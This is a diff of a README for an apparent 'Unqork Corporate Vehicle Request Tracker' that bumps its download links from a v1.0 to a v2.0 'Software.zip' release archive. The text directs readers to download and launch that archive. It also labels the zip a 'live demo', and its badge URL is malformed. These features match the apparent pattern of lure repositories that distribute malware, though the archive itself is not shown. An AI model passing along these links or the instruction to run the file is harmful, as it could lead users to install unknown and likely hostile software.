@@ -26,11 +26,11 @@ The Unqork Corporate Vehicle Request Tracker is a powerful application built on 
 - **Workflow Automation**: Automate repetitive tasks to improve productivity.
 
 ## Demo 🎥
-To get a better understanding of how the Unqork Corporate Vehicle Request Tracker operates, you can check out the live demo [here](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v1.0/Software.zip) and explore its features.
+To get a better understanding of how the Unqork Corporate Vehicle Request Tracker operates, you can check out the live demo [here](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v2.0/Software.zip) and explore its features.
 
 ## Installation 💻
 To install the Unqork Corporate Vehicle Request Tracker, follow these steps:
-1. Download the latest release from [here](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v1.0/Software.zip).
+1. Download the latest release from [here](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v2.0/Software.zip).
 2. Launch the downloaded file to start the installation process.
 
 ## Usage 🚀
@@ -44,7 +44,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![Download Latest Release](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v1.0/Software.zip)
+[![Download Latest Release](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/OyasumePunpun/unqork-corporate-vehicle-request-tracker/releases/download/v2.0/Software.zip)
 
 ---
 
